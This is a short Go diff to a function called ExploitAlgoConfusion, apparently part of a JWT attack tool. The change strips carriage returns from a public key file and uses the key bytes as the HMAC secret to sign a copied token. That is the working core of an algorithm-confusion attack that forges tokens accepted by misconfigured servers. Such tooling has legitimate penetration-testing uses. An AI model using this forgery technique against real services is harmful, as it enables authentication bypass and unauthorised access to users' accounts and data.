@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"strings"
 
 	"github.com/golang-jwt/jwt/v5"
 )
@@ -84,15 +85,15 @@ func ExploitAlgoConfusion(token *jwt.Token, algorithm string, publicKeyFile stri
 	// 	fmt.Printf("%v \n", err)
 	// 	return ""
 	// }
-	//
+
 	content, err := os.ReadFile(publicKeyFile)
 	if err != nil {
 		fmt.Printf("%v \n", err)
 		return ""
 	}
 
-	//Sign the token with the public key
-	strToken, err := cpyToken.SignedString(content)
+	strToken, err := cpyToken.SignedString([]byte(strings.ReplaceAll(string(content), "\r", "")))
+
 	if err != nil {
 		fmt.Printf("%v \n", err)
 		return ""
